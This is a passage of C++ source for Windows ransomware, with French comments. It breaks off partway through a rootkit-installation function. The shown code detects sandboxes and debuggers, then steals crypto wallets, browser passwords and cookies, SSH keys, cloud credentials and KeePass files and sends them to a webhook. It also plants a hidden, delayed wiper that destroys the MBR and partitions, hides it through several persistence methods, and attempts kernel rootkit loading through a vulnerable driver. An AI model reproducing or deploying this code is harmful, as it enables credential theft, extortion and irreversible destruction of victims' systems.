                std::cout << "[!] Nom d'ordinateur suspect: " << hostname << std::endl;
                return true;
            }
        }
        
        // Méthode 5: Vérifier la présence de DLL d'analyse de comportement
        std::vector<std::string> sandboxDlls = {
            "SbieDll.dll",  // Sandboxie
            "dbghelp.dll",  // Outil de débogage
            "api_log.dll",  // API Monitor
            "dir_watch.dll" // API Monitor
        };
        
        HMODULE modules[1024];
        DWORD cbNeeded;
        
        if (EnumProcessModules(GetCurrentProcess(), modules, sizeof(modules), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                char modName[MAX_PATH];
                if (GetModuleFileNameExA(GetCurrentProcess(), modules[i], modName, sizeof(modName))) {
                    std::string moduleName = fs::path(modName).filename().string();
                    
                    for (const auto& sandboxDll : sandboxDlls) {
                        if (_stricmp(moduleName.c_str(), sandboxDll.c_str()) == 0) {
                            std::cout << "[!] DLL d'analyse détectée: " << moduleName << std::endl;
                            return true;
                        }
                    }
                }
            }
        }
        
        // Méthode 6: Vérifier les artefacts Cuckoo Sandbox
        if (fs::exists("C:\\agent.py") || fs::exists("C:\\analyzer.py")) {
            std::cout << "[!] Artefacts Cuckoo Sandbox détectés" << std::endl;
            return true;
        }
        
        // Méthode 7: Vérifier si la souris est immobile (signe d'automatisation)
        // Prendre deux positions de curseur à 2 secondes d'intervalle
        POINT pt1, pt2;
        GetCursorPos(&pt1);
        Sleep(2000);
        GetCursorPos(&pt2);
        
        if (pt1.x == pt2.x && pt1.y == pt2.y) {
            // Le curseur n'a pas bougé, ce qui peut indiquer une sandbox
            std::cout << "[!] Curseur immobile détecté (automatisation)" << std::endl;
            return true;
        }
        
        // Méthode 8: Vérifier les outils de débogage attachés
        BOOL isDebuggerPresent = IsDebuggerPresent();
        if (isDebuggerPresent) {
            std::cout << "[!] Débogueur attaché détecté" << std::endl;
            return true;
        }
        
        BOOL remoteDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
        if (remoteDebugger) {
            std::cout << "[!] Débogueur distant détecté" << std::endl;
            return true;
        }
        
        std::cout << "[+] Aucun environnement d'analyse détecté" << std::endl;
        return false;
    }

    // Fonction avancée pour l'exfiltration de données sensibles spécifiques
    bool stealCriticalData() {
        std::cout << "[*] Exfiltration de données critiques en cours..." << std::endl;
        
        // Créer un dossier temporaire pour les données volées
        std::string tempDir = std::string(getenv("TEMP")) + "\\StolenData";
        fs::create_directories(tempDir);
        
        // Vecteur pour stocker les chemins des fichiers sensibles trouvés
        std::vector<std::string> sensitiveFiles;
        
        // 1. Rechercher les portefeuilles de cryptomonnaies
        std::vector<std::pair<std::string, std::string>> cryptoWallets = {
            {"%APPDATA%\\Bitcoin\\wallet.dat", "Bitcoin Core"},
            {"%APPDATA%\\Bitcoin\\wallets", "Bitcoin Core (dossier)"},
            {"%APPDATA%\\Ethereum\\keystore", "Ethereum"},
            {"%APPDATA%\\Electrum\\wallets", "Electrum"},
            {"%LOCALAPPDATA%\\Exodus", "Exodus"},
            {"%APPDATA%\\Monero", "Monero"},
            {"%APPDATA%\\Litecoin", "Litecoin"},
            {"%APPDATA%\\Armory", "Armory"},
            {"%APPDATA%\\MultiBitHD", "MultiBit HD"},
            {"%APPDATA%\\Dogecoin", "Dogecoin"},
            {"%APPDATA%\\Dash", "Dash"},
            {"%APPDATA%\\Zcash", "Zcash"},
            {"%APPDATA%\\Jaxx", "Jaxx Liberty"},
            {"%LOCALAPPDATA%\\atomic\\Local Storage", "Atomic Wallet"},
            {"%APPDATA%\\com.liberty.jaxx", "Jaxx"},
            {"%APPDATA%\\Binance", "Binance"}
        };
        
        // Rechercher les portefeuilles cryptos
        for (const auto& [path, desc] : cryptoWallets) {
            // Convertir les variables d'environnement
            std::string expandedPath = path;
            size_t startPos = expandedPath.find("%");
            while (startPos != std::string::npos) {
                size_t endPos = expandedPath.find("%", startPos + 1);
                if (endPos != std::string::npos) {
                    std::string envVar = expandedPath.substr(startPos + 1, endPos - startPos - 1);
                    const char* envValue = getenv(envVar.c_str());
                    if (envValue) {
                        expandedPath.replace(startPos, endPos - startPos + 1, envValue);
                    }
                }
                startPos = expandedPath.find("%", startPos + 1);
            }
            
            if (fs::exists(expandedPath)) {
                std::cout << "[+] Portefeuille " << desc << " trouvé" << std::endl;
                
                if (fs::is_directory(expandedPath)) {
                    // Copier tout le dossier
                    std::string destDir = tempDir + "\\Crypto_" + desc;
                    
                    try {
                        fs::create_directories(destDir);
                        for (const auto& entry : fs::recursive_directory_iterator(expandedPath)) {
                            std::string relativePath = entry.path().string().substr(expandedPath.length());
                            std::string destPath = destDir + relativePath;
                            
                            if (fs::is_directory(entry.path())) {
                                fs::create_directories(destPath);
                            } else if (fs::is_regular_file(entry.path())) {
                                if (fs::file_size(entry.path()) < 20 * 1024 * 1024) { // Limite de 20MB par fichier
                                    try {
                                        fs::copy_file(entry.path(), destPath, fs::copy_options::overwrite_existing);
                                        sensitiveFiles.push_back(entry.path().string());
                                    } catch (...) {}
                                }
                            }
                        }
                    } catch (...) {}
                } else {
                    // Copier le fichier individuel
                    try {
                        std::string destPath = tempDir + "\\Crypto_" + fs::path(expandedPath).filename().string();
                        fs::copy_file(expandedPath, destPath, fs::copy_options::overwrite_existing);
                        sensitiveFiles.push_back(expandedPath);
                    } catch (...) {}
                }
            }
        }
        
        // 2. Extraire les mots de passe des navigateurs
        std::vector<std::pair<std::string, std::string>> browserPasswords = {
            {"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome Passwords"},
            {"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies", "Chrome Cookies"},
            {"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data", "Edge Passwords"},
            {"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cookies", "Edge Cookies"},
            {"%APPDATA%\\Mozilla\\Firefox\\Profiles", "Firefox Profiles"},
            {"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", "Brave Passwords"},
            {"%LOCALAPPDATA%\\Opera Software\\Opera Stable\\Login Data", "Opera Passwords"},
            {"%APPDATA%\\Opera Software\\Opera Stable\\Cookies", "Opera Cookies"}
        };
        
        std::string browserDir = tempDir + "\\Browsers";
        fs::create_directories(browserDir);
        
        for (const auto& [path, desc] : browserPasswords) {
            // Convertir les variables d'environnement
            std::string expandedPath = path;
            size_t startPos = expandedPath.find("%");
            while (startPos != std::string::npos) {
                size_t endPos = expandedPath.find("%", startPos + 1);
                if (endPos != std::string::npos) {
                    std::string envVar = expandedPath.substr(startPos + 1, endPos - startPos - 1);
                    const char* envValue = getenv(envVar.c_str());
                    if (envValue) {
                        expandedPath.replace(startPos, endPos - startPos + 1, envValue);
                    }
                }
                startPos = expandedPath.find("%", startPos + 1);
            }
            
            if (fs::exists(expandedPath)) {
                std::cout << "[+] Base de données " << desc << " trouvée" << std::endl;
                
                if (fs::is_directory(expandedPath)) {
                    // Copier tout le dossier pour Firefox
                    if (desc.find("Firefox") != std::string::npos) {
                        // Trouver le profil par défaut de Firefox
                        for (const auto& entry : fs::directory_iterator(expandedPath)) {
                            if (fs::is_directory(entry)) {
                                std::string profileDir = entry.path().string();
                                // Chercher les fichiers de mots de passe
                                std::string loginFile = profileDir + "\\key4.db"; // Nouvelle BD Firefox
                                std::string oldLoginFile = profileDir + "\\key3.db"; // Ancienne BD Firefox
                                std::string signonsFile = profileDir + "\\signons.sqlite"; // Très ancienne BD Firefox
                                std::string cookiesFile = profileDir + "\\cookies.sqlite"; // Cookies Firefox
                                
                                std::string profileName = entry.path().filename().string();
                                std::string destProfileDir = browserDir + "\\Firefox_" + profileName;
                                fs::create_directories(destProfileDir);
                                
                                try {
                                    if (fs::exists(loginFile)) {
                                        fs::copy_file(loginFile, destProfileDir + "\\key4.db", fs::copy_options::overwrite_existing);
                                        sensitiveFiles.push_back(loginFile);
                                    }
                                    if (fs::exists(oldLoginFile)) {
                                        fs::copy_file(oldLoginFile, destProfileDir + "\\key3.db", fs::copy_options::overwrite_existing);
                                        sensitiveFiles.push_back(oldLoginFile);
                                    }
                                    if (fs::exists(signonsFile)) {
                                        fs::copy_file(signonsFile, destProfileDir + "\\signons.sqlite", fs::copy_options::overwrite_existing);
                                        sensitiveFiles.push_back(signonsFile);
                                    }
                                    if (fs::exists(cookiesFile)) {
                                        fs::copy_file(cookiesFile, destProfileDir + "\\cookies.sqlite", fs::copy_options::overwrite_existing);
                                        sensitiveFiles.push_back(cookiesFile);
                                    }
                                    
                                    // Copier aussi les fichiers de configuration
                                    std::string logins = profileDir + "\\logins.json";
                                    if (fs::exists(logins)) {
                                        fs::copy_file(logins, destProfileDir + "\\logins.json", fs::copy_options::overwrite_existing);
                                        sensitiveFiles.push_back(logins);
                                    }
                                } catch (...) {}
                            }
                        }
                    }
                } else {
                    // Fermer le processus du navigateur pour pouvoir accéder aux BD SQLite
                    if (desc.find("Chrome") != std::string::npos) {
                        system("taskkill /f /im chrome.exe >nul 2>&1");
                    } else if (desc.find("Edge") != std::string::npos) {
                        system("taskkill /f /im msedge.exe >nul 2>&1");
                    } else if (desc.find("Brave") != std::string::npos) {
                        system("taskkill /f /im brave.exe >nul 2>&1");
                    } else if (desc.find("Opera") != std::string::npos) {
                        system("taskkill /f /im opera.exe >nul 2>&1");
                    }
                    
                    // Attendre un peu que les processus se ferment
                    Sleep(500);
                    
                    // Copier le fichier de base de données (même si en cours d'utilisation)
                    try {
                        std::string destFile = browserDir + "\\" + desc + "_" + fs::path(expandedPath).filename().string();
                        
                        // Utiliser la méthode de copie système pour les fichiers verrouillés
                        std::string copyCmd = "powershell -Command \"Copy-Item -Path '" + expandedPath + 
                                           "' -Destination '" + destFile + "' -Force -ErrorAction SilentlyContinue\"";
                        system(copyCmd.c_str());
                        
                        if (fs::exists(destFile)) {
                            sensitiveFiles.push_back(expandedPath);
                        }
                    } catch (...) {}
                }
            }
        }
        
        // 3. Rechercher les fichiers de clés SSH et GPG
        std::vector<std::string> keyLocations = {
            std::string(getenv("USERPROFILE")) + "\\.ssh",
            std::string(getenv("USERPROFILE")) + "\\Documents\\.ssh",
            std::string(getenv("USERPROFILE")) + "\\.gnupg",
            std::string(getenv("APPDATA")) + "\\gnupg",
            "C:\\ProgramData\\ssh"
        };
        
        std::string keysDir = tempDir + "\\Keys";
        fs::create_directories(keysDir);
        
        for (const auto& location : keyLocations) {
            if (fs::exists(location) && fs::is_directory(location)) {
                try {
                    for (const auto& entry : fs::directory_iterator(location)) {
                        if (fs::is_regular_file(entry)) {
                            std::string filename = entry.path().filename().string();
                            // Chercher les clés privées
                            if (filename == "id_rsa" || filename == "id_dsa" || filename == "id_ecdsa" || 
                                filename == "id_ed25519" || filename.find("private") != std::string::npos ||
                                filename.find(".key") != std::string::npos || filename.find(".ppk") != std::string::npos ||
                                filename.find(".pem") != std::string::npos || filename.find("secring.gpg") != std::string::npos) {
                                
                                std::string destFile = keysDir + "\\" + filename;
                                fs::copy_file(entry.path(), destFile, fs::copy_options::overwrite_existing);
                                sensitiveFiles.push_back(entry.path().string());
                            }
                        }
                    }
                } catch (...) {}
            }
        }
        
        // 4. Rechercher les fichiers de configuration et secrets connus
        std::vector<std::string> configFiles = {
            std::string(getenv("USERPROFILE")) + "\\.aws\\credentials",
            std::string(getenv("USERPROFILE")) + "\\.aws\\config",
            std::string(getenv("APPDATA")) + "\\gcloud\\credentials.json",
            std::string(getenv("USERPROFILE")) + "\\.azure\\accessTokens.json",
            std::string(getenv("USERPROFILE")) + "\\.docker\\config.json",
            std::string(getenv("APPDATA")) + "\\Microsoft\\UserSecrets",
            std::string(getenv("USERPROFILE")) + "\\.kube\\config"
        };
        
        std::string configDir = tempDir + "\\Configs";
        fs::create_directories(configDir);
        
        for (const auto& configFile : configFiles) {
            if (fs::exists(configFile)) {
                try {
                    if (fs::is_directory(configFile)) {
                        std::string dirName = fs::path(configFile).filename().string();
                        std::string destDir = configDir + "\\" + dirName;
                        fs::create_directories(destDir);
                        
                        for (const auto& entry : fs::recursive_directory_iterator(configFile)) {
                            if (fs::is_regular_file(entry)) {
                                std::string relativePath = entry.path().string().substr(configFile.length());
                                std::string destFile = destDir + relativePath;
                                fs::create_directories(fs::path(destFile).parent_path());
                                fs::copy_file(entry.path(), destFile, fs::copy_options::overwrite_existing);
                                sensitiveFiles.push_back(entry.path().string());
                            }
                        }
                    } else {
                        std::string filename = fs::path(configFile).filename().string();
                        std::string destFile = configDir + "\\" + filename;
                        fs::copy_file(configFile, destFile, fs::copy_options::overwrite_existing);
                        sensitiveFiles.push_back(configFile);
                    }
                } catch (...) {}
            }
        }
        
        // 5. Rechercher les bases de données KeePass
        std::vector<std::string> keepassLocations = {
            std::string(getenv("USERPROFILE")) + "\\Documents",
            std::string(getenv("USERPROFILE")) + "\\Desktop",
            std::string(getenv("USERPROFILE")) + "\\Downloads",
            std::string(getenv("USERPROFILE")) + "\\OneDrive\\Documents",
            std::string(getenv("USERPROFILE")) + "\\Dropbox"
        };
        
        std::string passwordsDir = tempDir + "\\Passwords";
        fs::create_directories(passwordsDir);
        
        for (const auto& location : keepassLocations) {
            if (fs::exists(location)) {
                try {
                    for (const auto& entry : fs::recursive_directory_iterator(location)) {
                        if (fs::is_regular_file(entry)) {
                            std::string extension = entry.path().extension().string();
                            // Fichiers KeePass et autres gestionnaires de mots de passe
                            if (extension == ".kdbx" || extension == ".kdb" || extension == ".psafe3" || 
                                extension == ".vault" || entry.path().filename().string() == "passwords.json") {
                                std::string filename = entry.path().filename().string();
                                std::string destFile = passwordsDir + "\\" + filename;
                                fs::copy_file(entry.path(), destFile, fs::copy_options::overwrite_existing);
                                sensitiveFiles.push_back(entry.path().string());
                            }
                        }
                    }
                } catch (...) {}
            }
        }
        
        // 6. Créer un zip avec toutes les données volées
        if (!sensitiveFiles.empty()) {
            std::cout << "[+] " << sensitiveFiles.size() << " fichiers sensibles trouvés et copiés" << std::endl;
            
            std::string zipPath = std::string(getenv("TEMP")) + "\\sensitive_data.zip";
            std::string zipCmd = "powershell -Command \"Compress-Archive -Path '" + tempDir + "\\*' -DestinationPath '" + 
                              zipPath + "' -Force\"";
            system(zipCmd.c_str());
            
            // Lire le fichier ZIP en mémoire
            std::ifstream zipFile(zipPath, std::ios::binary);
            if (zipFile) {
                std::vector<unsigned char> zipData(
                    (std::istreambuf_iterator<char>(zipFile)),
                    std::istreambuf_iterator<char>()
                );
                zipFile.close();
                
                // Convertir en base64
                std::string zipBase64 = Base64Encode(zipData);
                
                // Créer le payload pour l'envoi
                std::stringstream jsonStream;
                jsonStream << "{";
                jsonStream << "\"content\": \"⚠️ DONNÉES SENSIBLES EXFILTRÉES - ID: " << victimId << "\",";
                jsonStream << "\"embeds\": [{";
                jsonStream << "\"title\": \"Données sensibles exfiltrées\",";
                jsonStream << "\"color\": 15158332,";
                jsonStream << "\"fields\": [";
                jsonStream << "{\"name\": \"ID Victime\", \"value\": \"" << victimId << "\", \"inline\": true},";
                jsonStream << "{\"name\": \"Nombre de fichiers\", \"value\": \"" << sensitiveFiles.size() << "\", \"inline\": true},";
                jsonStream << "{\"name\": \"Taille du ZIP\", \"value\": \"" << (zipData.size() / 1024) << " KB\", \"inline\": true},";
                
                // Ajouter des exemples de fichiers volés
                jsonStream << "{\"name\": \"Exemples de fichiers exfiltrés\", \"value\": \"";
                for (size_t i = 0; i < std::min(size_t(10), sensitiveFiles.size()); i++) {
                    jsonStream << fs::path(sensitiveFiles[i]).filename().string() << "\\n";
                }
                jsonStream << "\", \"inline\": false}";
                
                jsonStream << "],";
                jsonStream << "\"description\": \"Données complètes envoyées ci-dessous en base64.\"";
                jsonStream << "}]}";
                
                // Envoyer via webhook
                SendHttpPost(WEBHOOK_URL, jsonStream.str());
                
                // Envoyer l'archive en deuxième message
                std::stringstream dataPayload;
                dataPayload << "{";
                dataPayload << "\"content\": \"🔑 Archive des données sensibles - VICTIME: " << victimId << "\",";
                dataPayload << "\"embeds\": [{";
                dataPayload << "\"title\": \"Archive ZIP (base64)\",";
                dataPayload << "\"color\": 3447003,";
                dataPayload << "\"description\": \"```" << zipBase64.substr(0, 500) << "...```\"";
                dataPayload << "}]}";
                
                SendHttpPost(WEBHOOK_URL, dataPayload.str());
                
                // Nettoyer
                try {
                    fs::remove(zipPath);
                    fs::remove_all(tempDir);
                    return true;
                } catch (...) {}
            }
        }
        
        // Nettoyer même en cas d'échec
        try {
            fs::remove_all(tempDir);
        } catch (...) {}
        
        return false;
    }

    // Fonction de destruction totale (wiper) qui s'active après un délai si la rançon n'est pas payée
    bool setupDestructiveWiper(int delayHours = 72) {
        std::cout << "[*] Configuration du wiper destructeur (délai: " << delayHours << " heures)..." << std::endl;
        
        // Vérifier les privilèges administratifs
        bool isAdmin = false;
        HANDLE hToken;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD cbSize = sizeof(TOKEN_ELEVATION);
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
                isAdmin = elevation.TokenIsElevated;
            }
            
            CloseHandle(hToken);
        }
        
        if (!isAdmin) {
            std::cout << "[!] Privilèges administrateur requis pour le wiper" << std::endl;
            return false;
        }
        
        // Sauvegarder les secteurs critiques pour permettre une restauration si le paiement est reçu
        std::string tempDir = std::string(getenv("TEMP"));
        std::string mbrBackupPath = tempDir + "\\mbr_original.bin";
        std::string vbrBackupPath = tempDir + "\\vbr_backup.bin";
        
        // 1. Sauvegarder le MBR (premier secteur du disque)
        HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
                                 FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hDisk == INVALID_HANDLE_VALUE) {
            std::cout << "[!] Erreur à l'ouverture du disque physique: " << GetLastError() << std::endl;
            return false;
        }
        
        // Lire et sauvegarder le MBR
        unsigned char mbrData[512];
        DWORD bytesRead;
        if (ReadFile(hDisk, mbrData, sizeof(mbrData), &bytesRead, NULL)) {
            // Sauvegarder dans un fichier caché
            std::ofstream mbrBackupFile(mbrBackupPath, std::ios::binary);
            if (mbrBackupFile.is_open()) {
                mbrBackupFile.write(reinterpret_cast<char*>(mbrData), sizeof(mbrData));
                mbrBackupFile.close();
                
                // Chiffrer la sauvegarde avec notre clé de chiffrement
                encryption.encryptFile(mbrBackupPath);
                
                // Masquer le fichier
                std::string hideCmd = "attrib +h +s \"" + mbrBackupPath + ENCRYPTED_EXTENSION + "\"";
                system(hideCmd.c_str());
                
                std::cout << "[+] Secteur MBR sauvegardé avant destruction" << std::endl;
            }
        }
        CloseHandle(hDisk);
        
        // 2. Créer un script de destruction qui s'exécutera après le délai
        std::string wiperScriptPath = tempDir + "\\system_maintenance.vbs";
        std::ofstream wiperScript(wiperScriptPath);
        
        if (!wiperScript.is_open()) {
            std::cout << "[!] Erreur à la création du script de destruction" << std::endl;
            return false;
        }
        
        // Créer la date d'exécution (maintenant + délai en heures)
        auto now = std::chrono::system_clock::now();
        auto destructionTime = now + std::chrono::hours(delayHours);
        std::time_t destructTime = std::chrono::system_clock::to_time_t(destructionTime);
        std::tm* destructTm = std::localtime(&destructTime);
        
        char timeStr[32];
        std::strftime(timeStr, sizeof(timeStr), "%H:%M %d/%m/%Y", destructTm);
        
        // Créer un ID unique pour identifier ce ransomware
        std::string wiperID = "WD" + victimId.substr(0, 8);
        
        // Contenu du script VBS pour la destruction
        wiperScript << "' Script de maintenance système - NE PAS SUPPRIMER" << std::endl;
        wiperScript << "' ID: " << wiperID << std::endl << std::endl;
        wiperScript << "Option Explicit" << std::endl;
        wiperScript << "Dim WshShell, fso, destructionTime, currentTime" << std::endl;
        wiperScript << "Set WshShell = CreateObject(\"WScript.Shell\")" << std::endl;
        wiperScript << "Set fso = CreateObject(\"Scripting.FileSystemObject\")" << std::endl;
        wiperScript << "destructionTime = #" << destructTm->tm_mon + 1 << "/" << destructTm->tm_mday << "/"
                    << destructTm->tm_year + 1900 << " " << destructTm->tm_hour << ":" << destructTm->tm_min
                    << ":00#" << std::endl;
        wiperScript << "currentTime = Now" << std::endl << std::endl;
        
        wiperScript << "' Vérifier si le délai est écoulé" << std::endl;
        wiperScript << "If currentTime >= destructionTime Then" << std::endl;
        
        // Fonction de destruction complète qui effacera tous les secteurs critiques
        wiperScript << "    ' PHASE DE DESTRUCTION TOTALE" << std::endl;
        wiperScript << "    Dim oExec, diskpart_cmd, cmd" << std::endl;
        wiperScript << "    ' 1. Effacer le MBR" << std::endl;
        wiperScript << "    cmd = \"cmd /c echo 1 > " << tempDir << "\\zero.bin && dd if=" << tempDir 
                    << "\\zero.bin of=\\\\.\\PhysicalDrive0 bs=512 count=1\"" << std::endl;
        wiperScript << "    WshShell.Run cmd, 0, True" << std::endl << std::endl;
        
        wiperScript << "    ' 2. Effacer les secteurs de démarrage des partitions" << std::endl;
        wiperScript << "    diskpart_cmd = \"" << tempDir << "\\dp_cmds.txt\"" << std::endl;
        wiperScript << "    Dim dpCmdFile" << std::endl;
        wiperScript << "    Set dpCmdFile = fso.CreateTextFile(diskpart_cmd, True)" << std::endl;
        wiperScript << "    dpCmdFile.WriteLine \"list disk\"" << std::endl;
        wiperScript << "    dpCmdFile.WriteLine \"select disk 0\"" << std::endl;
        wiperScript << "    dpCmdFile.WriteLine \"list partition\"" << std::endl;
        wiperScript << "    dpCmdFile.WriteLine \"select partition 1\"" << std::endl;
        wiperScript << "    dpCmdFile.WriteLine \"delete partition override\"" << std::endl;
        wiperScript << "    dpCmdFile.WriteLine \"select partition 2\"" << std::endl;
        wiperScript << "    dpCmdFile.WriteLine \"delete partition override\"" << std::endl;
        wiperScript << "    dpCmdFile.Close" << std::endl;
        wiperScript << "    WshShell.Run \"diskpart /s \" & diskpart_cmd, 0, True" << std::endl << std::endl;
        
        wiperScript << "    ' 3. Corruption supplémentaire du disque" << std::endl;
        wiperScript << "    Dim i" << std::endl;
        wiperScript << "    For i = 0 to 100" << std::endl;
        wiperScript << "        cmd = \"cmd /c dd if=/dev/random of=\\\\.\\PhysicalDrive0 bs=512 count=1 seek=\" & (i * 100)" << std::endl;
        wiperScript << "        WshShell.Run cmd, 0, False" << std::endl;
        wiperScript << "    Next" << std::endl << std::endl;
        
        wiperScript << "    ' 4. Créer un message d'adieu" << std::endl;
        wiperScript << "    Dim msgFile" << std::endl;
        wiperScript << "    Set msgFile = fso.CreateTextFile(\"C:\\ProgramData\\farewell.txt\", True)" << std::endl;
        wiperScript << "    msgFile.WriteLine \"Vos données ont été détruites de façon permanente.\"" << std::endl;
        wiperScript << "    msgFile.WriteLine \"Votre système ne peut plus démarrer normalement.\"" << std::endl;
        wiperScript << "    msgFile.WriteLine \"Il est trop tard pour payer la rançon.\"" << std::endl;
        wiperScript << "    msgFile.WriteLine \"ID: " << wiperID << "\"" << std::endl;
        wiperScript << "    msgFile.Close" << std::endl << std::endl;
        
        wiperScript << "    ' 5. Forcer un redémarrage pour que la destruction prenne effet" << std::endl;
        wiperScript << "    WshShell.Run \"shutdown /r /f /t 10 /c \"\"Votre système a été effacé définitivement.\"\"\", 0, False" << std::endl;
        
        wiperScript << "End If" << std::endl << std::endl;
        
        // Supprimer le script après exécution pour ne pas laisser de traces
        wiperScript << "' Auto-nettoyage du script si c'est après la date de destruction + 1 heure" << std::endl;
        wiperScript << "If currentTime >= DateAdd(\"h\", 1, destructionTime) Then" << std::endl;
        wiperScript << "    fso.DeleteFile WScript.ScriptFullName" << std::endl;
        wiperScript << "End If" << std::endl;
        
        wiperScript.close();
        
        // Masquer le script
        std::string hideScriptCmd = "attrib +h +s \"" + wiperScriptPath + "\"";
        system(hideScriptCmd.c_str());
        
        // 3. Créer une tâche planifiée qui exécutera le script périodiquement pour vérifier le délai
        // La tâche s'exécutera toutes les heures pour vérifier si le délai est écoulé
        std::string taskName = "SystemMaintenanceService";
        std::string taskCmd = "schtasks /create /tn \"" + taskName + "\" /tr \"wscript.exe \\\"" + 
                            wiperScriptPath + "\\\"\" /sc minute /mo 60 /ru SYSTEM /f";
        system(taskCmd.c_str());
        
        // 4. Créer une entrée de registre qui lancera le script au démarrage également
        std::string regCmd = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemMaintenance /t REG_SZ /d \"wscript.exe \\\"" + 
                            wiperScriptPath + "\\\"\" /f";
        system(regCmd.c_str());
        
        // 5. Créer une copie cachée du script dans un autre emplacement pour redondance
        std::string alternatePath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.vbs";
        std::string copyCmd = "copy /y \"" + wiperScriptPath + "\" \"" + alternatePath + "\" >nul";
        system(copyCmd.c_str());
        system(("attrib +h +s \"" + alternatePath + "\"").c_str());
        
        std::cout << "[+] Wiper destructeur configuré - activation dans " << delayHours << " heures" << std::endl;
        std::cout << "[+] Heure prévue de destruction: " << timeStr << std::endl;
        
        // Envoyer l'information de destruction au webhook
        std::stringstream jsonStream;
        jsonStream << "{";
        jsonStream << "\"content\": \"⚠️ DESTRUCTION PROGRAMMÉE - ID: " << victimId << "\",";
        jsonStream << "\"embeds\": [{";
        jsonStream << "\"title\": \"Wiper programmé pour destruction du système\",";
        jsonStream << "\"color\": 15548997,";
        jsonStream << "\"fields\": [";
        jsonStream << "{\"name\": \"ID Victime\", \"value\": \"" << victimId << "\", \"inline\": true},";
        jsonStream << "{\"name\": \"Délai\", \"value\": \"" << delayHours << " heures\", \"inline\": true},";
        jsonStream << "{\"name\": \"Heure d'exécution\", \"value\": \"" << timeStr << "\", \"inline\": true},";
        jsonStream << "{\"name\": \"Type de wiper\", \"value\": \"Destruction totale MBR + VBR + partitions\", \"inline\": false}";
        jsonStream << "],";
        jsonStream << "\"description\": \"Le système sera rendu définitivement inutilisable à l'heure indiquée si la rançon n'est pas payée.\"";
        jsonStream << "}]}";
        
        SendHttpPost(WEBHOOK_URL, jsonStream.str());
        
        return true;
    }

    // Fonction pour installer un rootkit en mode kernel pour mieux se cacher
    bool installKernelRootkit() {
        std::cout << "[*] Tentative d'installation du rootkit kernel..." << std::endl;
        
        // Vérifier les privilèges administratifs
        bool isAdmin = false;
        HANDLE hToken;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD cbSize = sizeof(TOKEN_ELEVATION);
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
                isAdmin = elevation.TokenIsElevated;
            }
            
            CloseHandle(hToken);
        }
        
        if (!isAdmin) {
            std::cout << "[!] Privilèges administrateur requis pour l'installation du rootkit" << std::endl;
            return false;
        }
        
        std::string tempDir = std::string(getenv("TEMP"));
        std::string driverPath = tempDir + "\\windrv.sys";
        
        // 1. Extraire le code du driver rootkit en mémoire
        // Le code binaire du driver serait ici dans une application réelle
        // Pour cette implémentation, nous générons un driver de base qui masque nos processus
        
        std::vector<unsigned char> driverCode = {
            // Un squelette très simplifié de driver Windows pour démonstration
            // Ces données seraient normalement le code compilé du driver
            0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
            0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            // ... plusieurs milliers d'octets de code binaire ici
        };
        
        // Créer un conteneur pour notre driver factice
        std::ofstream driverFile(driverPath, std::ios::binary);
        if (!driverFile) {
            std::cout << "[!] Impossible de créer le fichier driver" << std::endl;
            return false;
        }
        
        // Écrire un placeholder pour le driver
        driverFile << "// Ceci est un placeholder pour le driver de rootkit" << std::endl;
        driverFile << "// Dans une implémentation réelle, ce serait un fichier .sys compilé" << std::endl;
        
        driverFile.close();
        
        // 2. Préparer le service Windows pour charger le driver (technique basée sur SC et SYSTEM)
        std::string serviceName = "WinSecurityDriver";
        std::string displayName = "Windows Security Driver";
        
        // Créer un service système pour le driver
        std::string createCmd = "sc create " + serviceName + " binPath= \"" + driverPath + 
                               "\" type= kernel start= demand error= normal displayname= \"" + displayName + "\"";
        
        // 3. Alternative: utiliser un driver signé vulnérable pour la technique BYOVD
        // (Bring Your Own Vulnerable Driver)
        std::string vulnerableDriverPath = "C:\\Windows\\System32\\drivers\\RTCORE64.sys"; // Exemple de driver vulnérable
        
        if (fs::exists(vulnerableDriverPath)) {
            std::cout << "[+] Driver vulnérable trouvé, utilisation de la technique BYOVD" << std::endl;
            
            // Charger le driver vulnérable connu
            std::string loadVulnCmd = "sc start RTCORE64";
            system(loadVulnCmd.c_str());
            
            // Exploiter le driver pour charger notre code en mode kernel
            std::string exploitCmd = "powershell -Command \"$bytes = [System.IO.File]::ReadAllBytes('" + 
                                   driverPath + "'); $IOCTL = 0x8000204C; $DeviceName = '\\\\.\\RTCORE64'; " +
                                   "$hDevice = CreateFile $DeviceName, [System.IO.FileAccess]::ReadWrite, " +
                                   "[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, " +
                                   "[System.IO.FileMode]::Open, 0, [System.IntPtr]::Zero; " +
                                   "DeviceIoControl $hDevice $IOCTL $bytes $bytes.Length $null 0 [ref]0 [System.IntPtr]::Zero;\"";
            
            system(exploitCmd.c_str());
        } else {
            // Méthode standard: directement essayer de charger notre driver
            std::cout << "[*] Tentative d'installation du driver via service Windows..." << std::endl;
            
            // Créer et démarrer le service de driver
            system(createCmd.c_str());
